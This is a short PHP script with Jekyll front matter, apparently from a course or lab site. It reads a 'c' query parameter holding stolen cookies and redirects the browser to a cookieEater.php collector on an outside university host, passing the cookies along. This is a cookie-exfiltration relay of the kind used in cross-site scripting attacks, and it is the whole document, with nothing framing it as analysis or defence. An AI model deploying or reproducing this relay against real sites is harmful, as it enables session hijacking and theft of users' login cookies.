---
layout: page
---

<?php
$cookies = $_GET["c"] . "\n";
header('Location: http://homes.cs.washington.edu/~trandan1/cookieEater.php?cookies=' . $cookies);
?>